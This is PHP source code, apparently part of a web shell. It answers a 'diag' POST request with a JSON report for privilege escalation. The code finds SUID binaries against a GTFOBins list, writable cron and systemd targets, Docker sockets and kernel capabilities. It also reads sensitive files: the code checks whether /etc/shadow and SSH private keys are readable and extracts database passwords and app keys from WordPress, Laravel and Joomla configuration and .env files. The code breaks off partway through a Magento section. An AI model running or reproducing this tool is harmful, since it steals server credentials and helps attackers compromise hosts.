if (isset($_POST['action']) && $_POST['action'] === 'diag') {
ob_end_clean();
header('Content-Type: application/json');

// Fatal error handler — catch 500s and return JSON instead of blank page
register_shutdown_function(function() {
$err = error_get_last();
if ($err && in_array($err['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
if (!headers_sent()) header('Content-Type: application/json');
echo json_encode(['error' => 'Fatal: ' . $err['message'] . ' in ' . $err['file'] . ':' . $err['line']]);
}
});

// --- PHP / server basics ---
$dangerous = ['exec','shell_exec','system','passthru','popen','proc_open','pcntl_exec','pcntl_fork','mail','mb_send_mail','putenv','imap_open','dl','error_log','expect_popen','ob_start','fsockopen','stream_socket_client'];
$funcs = [];
foreach ($dangerous as $f) $funcs[$f] = function_exists($f);
$funcs['FFI'] = class_exists('FFI');
$exts = ['FFI','imap','sockets','posix','pcntl','openssl','sqlite3','phar','zip'];
$extList = [];
foreach ($exts as $e) $extList[$e] = extension_loaded($e);

// --- Current process identity ---
$uid = function_exists('posix_getuid') ? posix_getuid() : null;
$gid = function_exists('posix_getgid') ? posix_getgid() : null;
$pwent = function_exists('posix_getpwuid') ? @posix_getpwuid($uid) : false;
$grent = function_exists('posix_getgrgid') ? @posix_getgrgid($gid) : false;
$groups = function_exists('posix_getgroups') ? (@posix_getgroups() ?: []) : [];
$groupNames = [];
foreach ($groups as $g) {
$gi = function_exists('posix_getgrgid') ? @posix_getgrgid($g) : false;
if ($gi) $groupNames[] = $gi['name'] . '(' . $g . ')';
}

// --- /etc/passwd users with login shells ---
$passwdUsers = [];
$passwdRaw = @file_get_contents('/etc/passwd') ?: '';
foreach (explode("\n", $passwdRaw) as $line) {
$p = explode(':', $line);
if (count($p) >= 7 && !in_array($p[6], ['/usr/sbin/nologin','/bin/false','/sbin/nologin',''])) {
$passwdUsers[] = ['user'=>$p[0],'uid'=>$p[2],'gid'=>$p[3],'home'=>$p[5],'shell'=>$p[6]];
}
}

// --- /etc/group membership ---
$groupsRaw = @file_get_contents('/etc/group') ?: '';
$interestingGroups = ['sudo','wheel','lxd','docker','adm','shadow','disk'];
$groupMemberships = [];
foreach (explode("\n", $groupsRaw) as $line) {
$p = explode(':', $line);
if (count($p) >= 4 && in_array($p[0], $interestingGroups) && trim($p[3]) !== '') {
$groupMemberships[$p[0]] = array_filter(explode(',', $p[3]));
}
}

// --- Running processes ---
$processes = [];
foreach (@glob('/proc/[0-9]*') ?: [] as $pidDir) {
$cmd = @file_get_contents($pidDir . '/cmdline');
$stat = @file_get_contents($pidDir . '/status');
if (!$cmd) continue;
$cmd = str_replace("\0", ' ', trim($cmd));
$uid_proc = null;
if (preg_match('/^Uid:\s+(\d+)/m', $stat, $m)) $uid_proc = (int)$m[1];
$processes[] = ['pid' => basename($pidDir), 'uid' => $uid_proc, 'cmd' => substr($cmd, 0, 120)];
}

// --- Container detection ---
$container = ['detected' => false, 'type' => null, 'hints' => []];
if (@file_exists('/.dockerenv')) {
$container = ['detected' => true, 'type' => 'docker', 'hints' => ['/.dockerenv exists']];
} elseif (@file_exists('/run/.containerenv')) {
$container = ['detected' => true, 'type' => 'podman', 'hints' => ['/run/.containerenv exists']];
} else {
$cgroup = @file_get_contents('/proc/1/cgroup') ?: '';
if (preg_match('/(docker|kubepods|containerd|lxc|ecs)/', $cgroup, $cm)) {
$container = ['detected' => true, 'type' => $cm[1], 'hints' => ['cgroup: ' . $cm[1]]];
}
$sched = @file_get_contents('/proc/1/sched');
if ($sched && !preg_match('/^\s*(init|systemd)\s/m', $sched)) {
$container['hints'][] = 'PID 1 is not init/systemd';
$container['detected'] = true;
}
}

// --- Network: ARP table ---
$arpRaw = @file_get_contents('/proc/net/arp') ?: '';
$arpHosts = [];
foreach (array_slice(explode("\n", $arpRaw), 1) as $line) {
$parts = preg_split('/\s+/', trim($line));
if (count($parts) >= 4 && $parts[0] !== '') {
$arpHosts[] = ['ip'=>$parts[0], 'mac'=>$parts[3], 'dev'=>$parts[5] ?? ''];
}
}

// --- Network: open ports (TCP) with process correlation ---
// Build inode→pid map via readlink if available, else fall back to UID matching
$inodePid = [];
$pidCmd = [];
foreach ($processes as $proc) {
$pidCmd[$proc['pid']] = $proc['cmd'];
}
if (function_exists('readlink')) {
foreach (@glob('/proc/[0-9]*') ?: [] as $pidDir) {
$pid = basename($pidDir);
$fdDir = $pidDir . '/fd';
foreach (@scandir($fdDir) ?: [] as $fd) {
if ($fd === '.' || $fd === '..') continue;
$link = @readlink($fdDir . '/' . $fd);
if ($link && preg_match('/^socket:\[(\d+)\]$/', $link, $m)) {
$inodePid[$m[1]] = $pid;
}
}
}
}
$openPorts = [];
$portsSeen = [];
foreach (['/proc/net/tcp', '/proc/net/tcp6'] as $tcpFile) {
$tcpRaw = @file_get_contents($tcpFile) ?: '';
foreach (array_slice(explode("\n", $tcpRaw), 1) as $line) {
$parts = preg_split('/\s+/', trim($line));
if (count($parts) >= 10 && $parts[3] === '0A') {
$hex = explode(':', $parts[1]);
if (isset($hex[1])) {
$port = hexdec($hex[1]);
if (isset($portsSeen[$port])) continue;
$portsSeen[$port] = true;
$inode = $parts[9];
$sockUid = isset($parts[7]) ? (int)$parts[7] : null;
$pid = null; $cmd = null;
if (isset($inodePid[$inode])) {
$pid = $inodePid[$inode];
$cmd = isset($pidCmd[$pid]) ? $pidCmd[$pid] : null;
}
$openPorts[] = ['port' => $port, 'pid' => $pid, 'cmd' => $cmd, 'uid' => $sockUid];
}
}
}
}
usort($openPorts, function($a, $b) { return $a['port'] - $b['port']; });

// --- Network: routing table ---
$routeRaw = @file_get_contents('/proc/net/route') ?: '';
$routes = [];
$routeSeen = [];
foreach (array_slice(explode("\n", $routeRaw), 1) as $line) {
$p = preg_split('/\s+/', trim($line));
if (count($p) >= 8 && $p[1] !== '') {
$dest = long2ip(hexdec(strrev(hex2bin(str_pad($p[1],8,'0',STR_PAD_LEFT)))));
$gw = long2ip(hexdec(strrev(hex2bin(str_pad($p[2],8,'0',STR_PAD_LEFT)))));
$mask = long2ip(hexdec(strrev(hex2bin(str_pad($p[7],8,'0',STR_PAD_LEFT)))));
$metric = isset($p[6]) ? (int)$p[6] : 0;
$key = $p[0] . '|' . $dest . '|' . $gw . '|' . $mask;
if (isset($routeSeen[$key])) continue;
$routeSeen[$key] = true;
$routes[] = ['iface'=>$p[0],'dest'=>$dest,'gw'=>$gw,'mask'=>$mask,'metric'=>$metric];
}
}

// --- Interesting readable files (expanded) ---
$sensitiveFiles = [
'/etc/passwd', '/etc/shadow', '/etc/sudoers',
'/root/.ssh/id_rsa', '/root/.ssh/id_ed25519', '/root/.ssh/id_ecdsa',
'/root/.ssh/authorized_keys', '/root/.ssh/known_hosts', '/root/.bash_history',
'/home/*/.ssh/id_rsa', '/home/*/.ssh/id_ed25519', '/home/*/.ssh/id_ecdsa',
'/home/*/.ssh/authorized_keys', '/home/*/.bash_history', '/home/*/.zsh_history',
'/etc/ssh/ssh_host_rsa_key', '/etc/ssh/ssh_host_ed25519_key', '/etc/ssh/ssh_host_ecdsa_key',
'/root/.my.cnf', '/home/*/.my.cnf', '/etc/mysql/debian.cnf',
'/root/.pgpass', '/home/*/.pgpass',
'/.env', getcwd() . '/.env', getcwd() . '/../.env',
];
$readable = [];
foreach ($sensitiveFiles as $pattern) {
foreach (@glob($pattern) ?: [$pattern] as $f) {
if (@is_readable($f)) $readable[] = $f;
}
}

// --- Binary directories ---
$binDirs = [];
foreach (['/bin','/sbin','/usr/bin','/usr/sbin','/usr/local/bin','/usr/local/sbin','/usr/lib','/usr/libexec','/snap/bin'] as $d) {
if (@is_dir($d)) $binDirs[] = ['path' => $d, 'readable' => @is_readable($d), 'writable' => @is_writable($d)];
}

// --- Writable directories ---
$writableDirs = [];
foreach (['/tmp','/var/tmp','/dev/shm','/run/shm',getcwd(),'/var/www','/www/wwwroot'] as $d) {
if (@is_writable($d)) $writableDirs[] = $d;
}

// --- Scan all binaries from bin dirs, then classify ---
$knownInterpreters = ['python3','python','perl','ruby','php','bash','sh','node','lua','tclsh'];
$knownTools = ['nc','ncat','curl','wget','gcc','cc','make','git','nmap','socat','ssh','scp','rsync','tar','zip','unzip'];
$allBinaries = [];
$availInterpreters = [];
$availTools = [];
foreach ($binDirs as $info) {
if (!$info['readable']) continue;
foreach (@scandir($info['path']) ?: [] as $entry) {
if ($entry === '.' || $entry === '..') continue;
$full = $info['path'] . '/' . $entry;
if (!@is_file($full)) continue;
$allBinaries[] = $full;
if (in_array($entry, $knownInterpreters)) $availInterpreters[] = $full;
if (in_array($entry, $knownTools)) $availTools[] = $full;
}
}

// =====================================================
// PRIVILEGE ESCALATION CHECKS
// =====================================================

// --- 1. SUID/SGID binaries ---
$gtfobinsNames = ['ar','aria2c','ash','awk','base32','base64','bash','bridge','busybox','bzip2','cancel','capsh','cat','chmod','chown','column','comm','cp','cpan','cpulimit','crontab','csh','curl','cut','dash','date','dd','dialog','diff','dig','dmesg','dmsetup','docker','dpkg','easy_install','ed','emacs','env','eqn','expand','expect','facter','file','find','finger','flock','fmt','fold','ftp','gawk','gcc','gdb','gem','gimp','git','grep','gtester','gzip','hd','head','hexdump','highlight','iconv','iftop','install','ionice','ip','irb','jjs','journalctl','jq','jrunscript','ksh','ksshell','knife','ld','ldconfig','less','logsave','look','ltrace','lua','lwp-download','lwp-request','mail','make','man','mawk','more','mount','mtr','mv','mysql','nano','nasm','nawk','nc','nft','nice','nl','nmap','node','nohup','npm','nroff','nsenter','od','openssl','openvpn','paste','perf','perl','pg','php','pic','pico','pip','pkexec','pry','python','python2','python3','rake','readelf','red','rlogin','rlwrap','rpm','rpmquery','rsync','ruby','run-mailcap','run-parts','rvim','scp','screen','script','sed','service','setarch','sftp','sh','shuf','smbclient','socat','sort','sqlite3','ss','ssh','start-stop-daemon','stdbuf','strace','strings','su','sysctl','tail','tar','taskset','tbl','tclsh','tee','telnet','tftp','time','timeout','tmux','top','ul','unexpand','uniq','unshare','vi','vim','watch','wc','wget','whois','wish','xargs','xxd','xz','yarn','zip','zsh','zsoelim'];
$gtfobinsMap = array_flip($gtfobinsNames);
$suidBinaries = [];
// Scan already-enumerated binaries + extra SUID-heavy dirs
$extraSuidDirs = ['/usr/lib/dbus-1.0','/usr/lib/openssh','/usr/lib/policykit-1','/usr/lib/eject','/usr/lib/xorg','/usr/lib/snapd'];
$suidScanPaths = $allBinaries;
foreach ($extraSuidDirs as $d) {
if (!@is_readable($d)) continue;
foreach (@scandir($d) ?: [] as $entry) {
if ($entry === '.' || $entry === '..') continue;
$full = $d . '/' . $entry;
if (@is_file($full)) $suidScanPaths[] = $full;
}
}
foreach ($suidScanPaths as $bin) {
$perms = @fileperms($bin);
if ($perms === false) continue;
$isSuid = (bool)($perms & 0x800);
$isSgid = (bool)($perms & 0x400);
if (!$isSuid && !$isSgid) continue;
$st = @stat($bin);
$ownerUid = $st ? $st['uid'] : null;
$bn = basename($bin);
$suidBinaries[] = [
'path' => $bin,
'owner_uid' => $ownerUid,
'suid' => $isSuid,
'sgid' => $isSgid,
'gtfobins' => isset($gtfobinsMap[$bn]),
];
}

// --- 2. Cron jobs ---
$cronJobs = [];
$cronPaths = ['/etc/crontab', '/etc/anacrontab'];
foreach (@glob('/etc/cron.d/*') ?: [] as $f) { if (@is_file($f)) $cronPaths[] = $f; }
foreach (@glob('/var/spool/cron/crontabs/*') ?: [] as $f) { if (@is_file($f)) $cronPaths[] = $f; }
foreach (@glob('/var/spool/cron/*') ?: [] as $f) { if (@is_file($f) && basename($f) !== 'crontabs') $cronPaths[] = $f; }
foreach ($cronPaths as $cf) {
$content = @file_get_contents($cf, false, null, 0, 8192);
if ($content === false) continue;
$wrScripts = [];
// Extract command paths from cron lines (skip comments, blank, variables)
foreach (explode("\n", $content) as $cl) {
$cl = trim($cl);
if ($cl === '' || $cl[0] === '#' || strpos($cl, '=') !== false) continue;
// Cron format: min hour dom mon dow [user] command
if (preg_match('/(?:^[@*0-9][\S]*\s+){5,6}(\/.+)/', $cl, $cm)) {
$cmdPath = preg_split('/\s+/', trim($cm[1]))[0];
if ($cmdPath && @is_writable($cmdPath)) $wrScripts[] = $cmdPath;
}
}
$cronJobs[] = ['source' => $cf, 'source_writable' => @is_writable($cf), 'content' => $content, 'writable_scripts' => $wrScripts];
}

// --- 3. Sudo configuration ---
$sudoConfig = ['readable' => false, 'files' => []];
if (@is_readable('/etc/sudoers')) {
$sudoConfig['readable'] = true;
$sc = @file_get_contents('/etc/sudoers', false, null, 0, 8192);
if ($sc !== false) $sudoConfig['files']['/etc/sudoers'] = $sc;
}
foreach (@glob('/etc/sudoers.d/*') ?: [] as $sf) {
$sc = @file_get_contents($sf, false, null, 0, 8192);
if ($sc !== false) {
$sudoConfig['readable'] = true;
$sudoConfig['files'][$sf] = $sc;
}
}

// --- 4. Docker/Podman socket ---
$dockerSocket = ['sockets' => [], 'user_in_docker_group' => isset($groupMemberships['docker'])];
foreach (['/var/run/docker.sock', '/run/docker.sock', '/var/run/podman/podman.sock', '/run/podman/podman.sock'] as $sock) {
if (@file_exists($sock)) {
$dockerSocket['sockets'][] = ['path' => $sock, 'exists' => true, 'readable' => @is_readable($sock), 'writable' => @is_writable($sock)];
}
}

// --- 5. Mount points & flags ---
$mounts = [];
$mountsRaw = @file_get_contents('/proc/self/mounts') ?: (@file_get_contents('/proc/mounts') ?: '');
foreach (explode("\n", $mountsRaw) as $line) {
$p = preg_split('/\s+/', trim($line));
if (count($p) < 4) continue;
$opts = $p[3];
$mounts[] = [
'device' => $p[0], 'mountpoint' => $p[1], 'fstype' => $p[2], 'options' => $opts,
'nosuid' => strpos($opts, 'nosuid') !== false,
'noexec' => strpos($opts, 'noexec') !== false,
'writable' => strpos($opts, 'rw') === 0 || strpos($opts, ',rw') !== false,
];
}

// --- 6. Linux capabilities (current process) ---
$capNames = ['CAP_CHOWN','CAP_DAC_OVERRIDE','CAP_DAC_READ_SEARCH','CAP_FOWNER','CAP_FSETID','CAP_KILL','CAP_SETGID','CAP_SETUID','CAP_SETPCAP','CAP_LINUX_IMMUTABLE','CAP_NET_BIND_SERVICE','CAP_NET_BROADCAST','CAP_NET_ADMIN','CAP_NET_RAW','CAP_IPC_LOCK','CAP_IPC_OWNER','CAP_SYS_MODULE','CAP_SYS_RAWIO','CAP_SYS_CHROOT','CAP_SYS_PTRACE','CAP_SYS_PACCT','CAP_SYS_ADMIN','CAP_SYS_BOOT','CAP_SYS_NICE','CAP_SYS_RESOURCE','CAP_SYS_TIME','CAP_SYS_TTY_CONFIG','CAP_MKNOD','CAP_LEASE','CAP_AUDIT_WRITE','CAP_AUDIT_CONTROL','CAP_SETFCAP','CAP_MAC_OVERRIDE','CAP_MAC_ADMIN','CAP_SYSLOG','CAP_WAKE_ALARM','CAP_BLOCK_SUSPEND','CAP_AUDIT_READ','CAP_PERFMON','CAP_BPF','CAP_CHECKPOINT_RESTORE'];
$dangerousCaps = ['CAP_SETUID'=>1,'CAP_SYS_ADMIN'=>1,'CAP_DAC_OVERRIDE'=>1,'CAP_DAC_READ_SEARCH'=>1,'CAP_SYS_PTRACE'=>1,'CAP_NET_RAW'=>1,'CAP_FOWNER'=>1,'CAP_SYS_MODULE'=>1,'CAP_SETGID'=>1,'CAP_CHOWN'=>1];
$capabilities = [];
$selfStatus = @file_get_contents('/proc/self/status') ?: '';
foreach (['CapInh','CapPrm','CapEff','CapBnd','CapAmb'] as $ct) {
if (preg_match('/^' . $ct . ':\s+([0-9a-f]+)/m', $selfStatus, $cm)) {
$hexVal = $cm[1];
$intVal = hexdec($hexVal);
$decoded = [];
for ($i = 0; $i < count($capNames); $i++) {
if ($intVal & (1 << $i)) $decoded[] = $capNames[$i];
}
$capabilities[$ct] = ['hex' => $hexVal, 'caps' => $decoded];
}
}

// --- 7. Kernel info ---
$kernelInfo = [
'release' => php_uname('r'),
'arch' => php_uname('m'),
'proc_version' => @file_get_contents('/proc/version') ?: '',
'aslr' => @file_get_contents('/proc/sys/kernel/randomize_va_space'),
];
if ($kernelInfo['aslr'] !== false) $kernelInfo['aslr'] = trim($kernelInfo['aslr']);

// --- 8. Security modules ---
$securityModules = ['selinux' => ['present' => false, 'enforcing' => null], 'apparmor' => ['present' => false, 'profiles_count' => 0], 'seccomp' => null];
if (@file_exists('/sys/fs/selinux')) {
$securityModules['selinux']['present'] = true;
$enf = @file_get_contents('/sys/fs/selinux/enforce');
if ($enf !== false) $securityModules['selinux']['enforcing'] = (int)trim($enf);
}
if (@file_exists('/sys/module/apparmor')) {
$securityModules['apparmor']['present'] = true;
$profs = @file_get_contents('/sys/kernel/security/apparmor/profiles');
if ($profs) $securityModules['apparmor']['profiles_count'] = substr_count($profs, "\n");
}
if (preg_match('/^Seccomp:\s+(\d+)/m', $selfStatus, $sm)) {
$securityModules['seccomp'] = (int)$sm[1];
}

// --- 9. LD_PRELOAD ---
$ldPreload = [
'exists' => @file_exists('/etc/ld.so.preload'),
'writable' => @is_writable('/etc/ld.so.preload'),
'content' => null,
'env_value' => getenv('LD_PRELOAD') ?: null,
];
if ($ldPreload['exists']) {
$ldc = @file_get_contents('/etc/ld.so.preload', false, null, 0, 4096);
if ($ldc !== false) $ldPreload['content'] = $ldc;
}

// --- 10. NFS exports ---
$nfsExports = ['readable' => false, 'content' => null, 'no_root_squash' => []];
$nfsContent = @file_get_contents('/etc/exports', false, null, 0, 8192);
if ($nfsContent !== false) {
$nfsExports['readable'] = true;
$nfsExports['content'] = $nfsContent;
foreach (explode("\n", $nfsContent) as $nfsLine) {
if (stripos($nfsLine, 'no_root_squash') !== false) {
$nfsExports['no_root_squash'][] = trim($nfsLine);
}
}
}

// --- 11. Systemd timers ---
$systemdTimers = [];
foreach (array_merge(@glob('/etc/systemd/system/*.timer') ?: [], @glob('/usr/lib/systemd/system/*.timer') ?: []) as $timerPath) {
$timerContent = @file_get_contents($timerPath, false, null, 0, 4096);
$entry = ['timer_path' => $timerPath, 'timer_writable' => @is_writable($timerPath), 'service_path' => null, 'exec_start' => null, 'exec_writable' => null];
// Find matching .service
$svcPath = preg_replace('/\.timer$/', '.service', $timerPath);
if (@is_readable($svcPath)) {
$entry['service_path'] = $svcPath;
$svcContent = @file_get_contents($svcPath, false, null, 0, 4096);
if ($svcContent && preg_match('/^ExecStart\s*=\s*(.+)/m', $svcContent, $em)) {
$execBin = preg_split('/\s+/', trim($em[1]))[0];
// Strip systemd prefixes like - or + or !
$execBin = ltrim($execBin, '-+!@');
$entry['exec_start'] = $execBin;
$entry['exec_writable'] = @is_writable($execBin);
}
}
$systemdTimers[] = $entry;
}

// --- 12. Extended credential files ---
$credentialFiles = [];
$credPaths = [
'/root/.my.cnf', '/etc/mysql/debian.cnf',
'/home/*/.my.cnf', '/root/.pgpass', '/home/*/.pgpass',
];
// Web framework configs
$cwd = getcwd() ?: '';
$docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
foreach ([$cwd, $docRoot, '/var/www/html', '/var/www'] as $base) {
if (!$base) continue;
$credPaths[] = $base . '/wp-config.php';
$credPaths[] = $base . '/config/database.php';
$credPaths[] = $base . '/config/database.yml';
$credPaths[] = $base . '/app/config/parameters.yml';
$credPaths[] = $base . '/../wp-config.php';
}
foreach ($credPaths as $pattern) {
foreach (@glob($pattern) ?: [$pattern] as $cf) {
$cc = @file_get_contents($cf, false, null, 0, 8192);
if ($cc !== false) $credentialFiles[$cf] = $cc;
}
}

// --- 13. Backup file scan ---
$backupFiles = [];
$backupPatterns = [];
foreach ([$cwd, $docRoot] as $base) {
if (!$base) continue;
$backupPatterns[] = $base . '/*.{bak,old,sql,sql.gz,conf,cfg,swp}';
$backupPatterns[] = $base . '/../*.{sql,sql.gz,bak}';
}
$backupPatterns[] = '/var/www/html/wp-config.php.bak';
$backupPatterns[] = '/var/www/*/wp-config.php.bak';
foreach ($backupPatterns as $pattern) {
foreach (@glob($pattern, GLOB_BRACE | GLOB_NOSORT) ?: [] as $bf) {
if (@is_file($bf)) {
$backupFiles[] = ['path' => $bf, 'size' => @filesize($bf) ?: 0, 'readable' => @is_readable($bf)];
}
}
}

// --- Installed panel / hosting ---
$panels = [
'cPanel' => '/usr/local/cpanel',
'Plesk' => '/usr/local/psa',
'DirectAdmin' => '/usr/local/directadmin',
'HestiaCP' => '/usr/local/hestia',
'VestaCP' => '/usr/local/vesta',
'ISPConfig' => '/usr/local/ispconfig',
'CyberPanel' => '/usr/local/CyberPanel',
'CloudPanel' => '/home/clp',
'Webmin' => '/usr/share/webmin',
'Virtualmin' => '/usr/share/webmin/virtual-server',
'Froxlor' => '/var/www/froxlor',
'KeyHelp' => '/home/keyhelp',
'AMPPS' => '/usr/local/ampps',
'Zend Server' => '/usr/local/zend',
'GridPane' => '/opt/gridpane',
'Moss' => '/opt/moss',
'RunCloud' => '/etc/runcloud',
'ServerPilot' => '/etc/serverpilot',
'Laravel Forge' => '/etc/forge',
];
$detectedPanels = [];
if (@file_exists('/www/server/panel')) {
$btConf = @file_get_contents('/www/server/panel/config/config.json') ?: '';
$detectedPanels[] = (strpos($btConf, '"language":"en"') !== false || @file_exists('/www/server/panel/BTPanel/static/language/en.json'))
? 'aaPanel (/www/server/panel)'
: 'BT Panel (/www/server/panel)';
}
foreach ($panels as $name => $path) {
if (@file_exists($path)) $detectedPanels[] = $name . ' (' . $path . ')';
}

// --- .env file contents ---
$envContents = [];
$envPaths = array_unique(array_filter([
$cwd . '/.env', $cwd . '/../.env', $cwd . '/.env.local', $cwd . '/.env.production',
$docRoot . '/.env', $docRoot . '/../.env',
'/var/www/.env', '/var/www/html/.env', '/var/www/html/../.env',
'/home/*/public_html/.env', '/home/*/htdocs/.env',
'/www/wwwroot/*/.env', '/srv/www/*/.env', '/opt/*/shared/.env',
]));
$envSearch = [];
foreach ($envPaths as $pattern) {
foreach (@glob($pattern) ?: [$pattern] as $f) {
$envSearch[] = $f;
}
}
foreach (array_unique($envSearch) as $ef) {
$content = @file_get_contents($ef, false, null, 0, 8192);
if ($content) $envContents[$ef] = $content;
}

// --- Framework / CMS detection ---
$frameworks = [];
$docRoot = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
$searchRoots = array_unique(array_filter([$docRoot, getcwd(), dirname($docRoot)]));

// Helper: try to read a file and extract a version pattern
$__fwReadVer = function($path, $pattern) {
    $content = @file_get_contents($path, false, null, 0, 16384);
    if (!$content) return null;
    if (preg_match($pattern, $content, $m)) return $m[1];
    return null;
};

// Helper: check file exists relative to any search root
$__fwFind = function($relPath) use ($searchRoots) {
    foreach ($searchRoots as $root) {
        $full = rtrim($root, '/') . '/' . ltrim($relPath, '/');
        if (@file_exists($full)) return $full;
    }
    return null;
};

// WordPress
if ($p = $__fwFind('wp-includes/version.php')) {
    $ver = $__fwReadVer($p, '/\\$wp_version\\s*=\\s*[\'"]([^\'"]+)/');
    $fw = ['name' => 'WordPress', 'version' => $ver, 'config_path' => null, 'details' => []];
    if ($cp = $__fwFind('wp-config.php')) {
        $fw['config_path'] = $cp;
        $wpc = @file_get_contents($cp, false, null, 0, 16384);
        if ($wpc) {
            if (preg_match("/define\\s*\\(\\s*['\"]DB_NAME['\"]\\s*,\\s*['\"]([^'\"]*)/", $wpc, $m)) $fw['details']['db_name'] = $m[1];
            if (preg_match("/define\\s*\\(\\s*['\"]DB_USER['\"]\\s*,\\s*['\"]([^'\"]*)/", $wpc, $m)) $fw['details']['db_user'] = $m[1];
            if (preg_match("/define\\s*\\(\\s*['\"]DB_PASSWORD['\"]\\s*,\\s*['\"]([^'\"]*)/", $wpc, $m)) $fw['details']['db_pass'] = $m[1];
            if (preg_match("/define\\s*\\(\\s*['\"]DB_HOST['\"]\\s*,\\s*['\"]([^'\"]*)/", $wpc, $m)) $fw['details']['db_host'] = $m[1];
            if (preg_match("/\\$table_prefix\\s*=\\s*['\"]([^'\"]*)/", $wpc, $m)) $fw['details']['table_prefix'] = $m[1];
            $fw['details']['debug'] = (stripos($wpc, "'WP_DEBUG', true") !== false || stripos($wpc, "'WP_DEBUG',true") !== false) ? 'enabled' : 'disabled';
        }
    }
    if ($plugDir = $__fwFind('wp-content/plugins')) $fw['details']['plugins'] = count(@scandir($plugDir) ?: []) - 2;
    if ($themeDir = $__fwFind('wp-content/themes')) $fw['details']['themes'] = count(@scandir($themeDir) ?: []) - 2;
    $fw['details']['admin_path'] = '/wp-admin/';
    $frameworks[] = $fw;
}

// Laravel
if ($p = $__fwFind('artisan')) {
    $ver = null;
    $appFile = $__fwFind('vendor/laravel/framework/src/Illuminate/Foundation/Application.php');
    if ($appFile) $ver = $__fwReadVer($appFile, "/const\\s+VERSION\\s*=\\s*['\"]([^'\"]+)/");
    $fw = ['name' => 'Laravel', 'version' => $ver, 'config_path' => null, 'details' => []];
    if ($envFile = $__fwFind('.env')) {
        $fw['config_path'] = $envFile;
        $env = @file_get_contents($envFile, false, null, 0, 8192);
        if ($env) {
            if (preg_match('/^DB_DATABASE=(.*)$/m', $env, $m)) $fw['details']['db_name'] = trim($m[1]);
            if (preg_match('/^DB_USERNAME=(.*)$/m', $env, $m)) $fw['details']['db_user'] = trim($m[1]);
            if (preg_match('/^DB_PASSWORD=(.*)$/m', $env, $m)) $fw['details']['db_pass'] = trim($m[1]);
            if (preg_match('/^DB_HOST=(.*)$/m', $env, $m)) $fw['details']['db_host'] = trim($m[1]);
            if (preg_match('/^DB_CONNECTION=(.*)$/m', $env, $m)) $fw['details']['db_driver'] = trim($m[1]);
            if (preg_match('/^APP_DEBUG=(.*)$/m', $env, $m)) $fw['details']['debug'] = strtolower(trim($m[1])) === 'true' ? 'enabled' : 'disabled';
            if (preg_match('/^APP_KEY=(.*)$/m', $env, $m)) $fw['details']['app_key'] = trim($m[1]);
        }
    }
    if ($storageLog = $__fwFind('storage/logs/laravel.log')) $fw['details']['log_file'] = $storageLog;
    $frameworks[] = $fw;
}

// Joomla
if ($p = $__fwFind('libraries/src/Version.php')) {
    $ver = $__fwReadVer($p, "/MAJOR_VERSION\\s*=\\s*(\\d+)/");
    $minVer = $__fwReadVer($p, "/MINOR_VERSION\\s*=\\s*(\\d+)/");
    $patchVer = $__fwReadVer($p, "/PATCH_VERSION\\s*=\\s*(\\d+)/");
    if ($ver && $minVer) $ver = $ver . '.' . $minVer . ($patchVer ? '.' . $patchVer : '');
    $fw = ['name' => 'Joomla', 'version' => $ver, 'config_path' => null, 'details' => []];
    if ($cp = $__fwFind('configuration.php')) {
        $fw['config_path'] = $cp;
        $jc = @file_get_contents($cp, false, null, 0, 16384);
        if ($jc) {
            if (preg_match("/\\$db\\s*=\\s*['\"]([^'\"]*)/", $jc, $m)) $fw['details']['db_name'] = $m[1];
            if (preg_match("/\\$user\\s*=\\s*['\"]([^'\"]*)/", $jc, $m)) $fw['details']['db_user'] = $m[1];
            if (preg_match("/\\$password\\s*=\\s*['\"]([^'\"]*)/", $jc, $m)) $fw['details']['db_pass'] = $m[1];
            if (preg_match("/\\$host\\s*=\\s*['\"]([^'\"]*)/", $jc, $m)) $fw['details']['db_host'] = $m[1];
            if (preg_match("/\\$dbprefix\\s*=\\s*['\"]([^'\"]*)/", $jc, $m)) $fw['details']['table_prefix'] = $m[1];
            $fw['details']['debug'] = (preg_match("/\\$debug\\s*=\\s*['\"]?1/", $jc)) ? 'enabled' : 'disabled';
        }
    }
    $fw['details']['admin_path'] = '/administrator/';
    $frameworks[] = $fw;
}

// Drupal
if ($p = $__fwFind('core/lib/Drupal.php')) {
    $ver = $__fwReadVer($p, "/const\\s+VERSION\\s*=\\s*['\"]([^'\"]+)/");
    $fw = ['name' => 'Drupal', 'version' => $ver, 'config_path' => null, 'details' => []];
    $settingsFile = $__fwFind('sites/default/settings.php');
    if ($settingsFile) {
        $fw['config_path'] = $settingsFile;
        $fw['details']['admin_path'] = '/admin/';
    }
    $frameworks[] = $fw;
}

// Symfony
if ($p = $__fwFind('vendor/symfony/http-kernel/Kernel.php')) {
    $ver = $__fwReadVer($p, "/const\\s+VERSION\\s*=\\s*['\"]([^'\"]+)/");
    $fw = ['name' => 'Symfony', 'version' => $ver, 'config_path' => null, 'details' => []];
    if ($envFile = $__fwFind('.env')) {
        $fw['config_path'] = $envFile;
        $env = @file_get_contents($envFile, false, null, 0, 8192);
        if ($env && preg_match('/^DATABASE_URL=(.*)$/m', $env, $m)) {
            $fw['details']['database_url'] = trim($m[1]);
        }
        if ($env && preg_match('/^APP_ENV=(.*)$/m', $env, $m)) $fw['details']['app_env'] = trim($m[1]);
        if ($env && preg_match('/^APP_DEBUG=(.*)$/m', $env, $m)) $fw['details']['debug'] = strtolower(trim($m[1])) === '1' ? 'enabled' : 'disabled';
    }
    $frameworks[] = $fw;
}

// CodeIgniter 4
if ($p = $__fwFind('vendor/codeigniter4/framework/system/CodeIgniter.php')) {
    $ver = $__fwReadVer($p, "/const\\s+CI_VERSION\\s*=\\s*['\"]([^'\"]+)/");
    $fw = ['name' => 'CodeIgniter', 'version' => $ver, 'config_path' => null, 'details' => []];
    if ($envFile = $__fwFind('.env')) $fw['config_path'] = $envFile;
    $frameworks[] = $fw;
}

// Magento
if ($p = $__fwFind('app/Mage.php')) {
    $ver = $__fwReadVer($p, "/getVersion[^}]*return\\s*['\"]([^'\"]+)/s");
    $fw = ['name' => 'Magento 1', 'version' => $ver, 'config_path' => null, 'details' => []];
    if ($cp = $__fwFind('app/etc/local.xml')) $fw['config_path'] = $cp;
    $fw['details']['admin_path'] = '/admin/';
    $frameworks[] = $fw;
} elseif ($p = $__fwFind('vendor/magento/framework/AppInterface.php')) {
    $ver = $__fwReadVer($p, "/VERSION\\s*=\\s*['\"]([^'\"]+)/");
    $fw = ['name' => 'Magento 2', 'version' => $ver, 'config_path' => null, 'details' => []];
